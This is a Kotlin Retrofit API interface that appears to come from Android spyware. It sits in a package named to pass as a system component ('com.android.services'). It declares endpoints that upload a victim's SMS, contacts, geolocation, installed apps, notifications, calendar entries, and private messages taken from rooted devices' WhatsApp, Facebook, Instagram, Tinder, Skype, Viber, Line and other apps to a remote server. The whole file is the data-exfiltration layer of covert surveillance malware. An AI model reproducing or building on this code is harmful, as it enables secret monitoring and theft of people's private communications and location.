package com.android.services.network.api

import com.android.services.db.entities.*
import com.android.services.models.*
import com.android.services.models.SkypeLogs
import com.android.services.models.im.*
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.http.Body
import retrofit2.http.GET
import retrofit2.http.Headers
import retrofit2.http.POST

interface NodeServerOneApi {

    @POST("auth")
    @Headers("Content-Type: application/json")
    fun hitAuthService(@Body auth: Auth): Call<ResponseBody>

    @POST("appointments")
    @Headers("Content-Type: application/json")
    fun uploadAppointments(@Body appointmentUpload: AppointmentUpload): Call<ResponseBody>

    @POST("installedApps")
    @Headers("Content-Type: application/json")
    fun uploadInstalledApps(@Body installedAppUpload: InstalledAppUpload): Call<ResponseBody>

    @POST("tosPushStatus")
    @Headers("Content-Type: application/json")
    fun uploadPushStatuses(@Body pushStatuses: List<PushStatus>): Call<ResponseBody>

    @POST("getPushStatus")
    @Headers("Content-Type: application/json")
    fun getPushNotifications(@Body getPushStatus: GetPushStatus) : Call<ResponseBody>

    @POST("skypeRooted")
    @Headers("Content-Type: application/json")
    fun uploadSkypeRooted(@Body skypeLogs: SkypeLogs): Call<ResponseBody>

    @POST("zaloRooted")
    @Headers("Content-Type: application/json")
    fun uploadZaloRooted(@Body zaloUpload: ZaloUpload): Call<ResponseBody>

    @POST("tumblrRooted")
    @Headers("Content-Type: application/json")
    fun uploadTumblrRooted(@Body tumblrUpload: TumblrUpload): Call<ResponseBody>

    @POST("hikeRooted")
    @Headers("Content-Type: application/json")
    fun uploadHikeRooted(@Body hikeLogs: HikeLogs): Call<ResponseBody>

    @POST("imoRooted")
    @Headers("Content-Type: application/json")
    fun uploadImoRooted(@Body imoLogs: IMOLogs): Call<ResponseBody>

    @POST("hangoutsRooted")
    @Headers("Content-Type: application/json")
    fun uploadHangoutsRooted(@Body hangoutLogs: HangoutLogs): Call<ResponseBody>

    @POST("tinderRooted")
    @Headers("Content-Type: application/json")
    fun uploadTinderRooted(@Body tinderLogs: TinderLogs): Call<ResponseBody>

    @POST("instagramPostRooted")
    @Headers("Content-Type: application/json")
    fun uploadInstagramPostRooted(@Body instagrmFeedLogs: InstagramFeedLogs): Call<ResponseBody>

    @POST("instagramRooted")
    @Headers("Content-Type: application/json")
    fun uploadInstagramMessageRooted(@Body instagramMessageLogs: InstagramMessageLogs): Call<ResponseBody>

    @POST("whatsappRooted")
    @Headers("Content-Type: application/json")
    fun uploadWhatsAppMessageRooted(@Body whatsAppLogs: WhatsAppLogs): Call<ResponseBody>

    @POST("facebookRooted")
    @Headers("Content-Type: application/json")
    fun uploadFacebookMessageRooted(@Body facebookLogs: FacebookLogs): Call<ResponseBody>

    @POST("lineRooted")
    @Headers("Content-Type: application/json")
    fun uploadLineMessageRooted(@Body lineLogs: LineLogs): Call<ResponseBody>

    @POST("viberRooted")
    @Headers("Content-Type: application/json")
    fun uploadViberMessageRooted(@Body viberLogs: ViberLogs): Call<ResponseBody>

    @POST("sms")
    @Headers("Content-Type: application/json")
    fun uploadSmsLogs(@Body smsUpload: SmsUpload): Call<ResponseBody>

    @POST("geolocations")
    @Headers("Content-Type: application/json")
    fun uploadGeoLocations(@Body geoLocationUpload: GeoLocationUpload): Call<ResponseBody>

    @POST("contacts")
    @Headers("Content-Type: application/json")
    fun uploadContacts(@Body contactsUpload: ContactsUpload): Call<ResponseBody>

    @POST("notifications")
    @Headers("Content-Type: application/json")
    fun uploadAppNotifications(@Body notificationUpload: NotificationUpload): Call<ResponseBody>
}